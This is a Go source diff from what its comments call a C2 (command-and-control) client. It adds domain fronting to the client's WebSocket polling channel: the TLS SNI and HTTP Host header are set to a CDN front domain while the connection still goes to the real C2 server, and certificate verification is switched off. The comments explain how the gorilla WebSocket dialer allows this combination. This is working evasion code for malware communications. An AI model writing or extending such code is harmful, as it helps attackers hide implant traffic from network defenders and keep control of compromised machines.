@@ -3,8 +3,10 @@
 package main
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"net/http"
 	"net/url"
 	"strings"
 	"sync"
@@ -120,7 +122,31 @@ func wsPollRun() {
 	dialer := websocket.Dialer{
 		HandshakeTimeout: 10 * time.Second,
 	}
-	conn, _, err := dialer.Dial(u.String(), nil)
+	// 域前置（与 HTTP 通道**同一口径**，见 transport_http.go / transport_tls_std.go）：
+	//   - 连接目标仍然是 serverAddr（真实 C2 地址，TLS 握手对象也是它）；
+	//   - TLS SNI 用 front_domain（仅 wss）；
+	//   - HTTP Host 头用 front_domain。
+	//
+	// 为什么这里不冲突（曾担心 gorilla 不允许同时设 SNI 与 Host）：gorilla 的
+	// Dialer 对 requestHeader 里的 "Host" 键**特判**，赋给 req.Host 而不是塞进
+	// Header（client.go: case k == "Host": req.Host = vs[0]），而 SNI 走
+	// TLSClientConfig.ServerName（仅在 ServerName 为空时才回退成 URL 主机名）。
+	// 因此"SNI=前置域 + Host=前置域 + 连接真实服务器地址"三者可以同时成立，
+	// 不需要自造一套语义。
+	var hdr http.Header
+	if fd := strings.TrimSpace(frontDomain); fd != "" {
+		hdr = http.Header{}
+		hdr.Set("Host", fd)
+		if u.Scheme == "wss" {
+			dialer.TLSClientConfig = &tls.Config{
+				ServerName: fd,
+				// 与 HTTP 通道一致：前置域往往是 CDN 的泛域名证书（或边缘节点
+				// 上的其它证书），不做链校验；传输内容由 WS 帧内的 AES-GCM 保护。
+				InsecureSkipVerify: true,
+			}
+		}
+	}
+	conn, _, err := dialer.Dial(u.String(), hdr)
 	if err != nil {
 		return
 	}
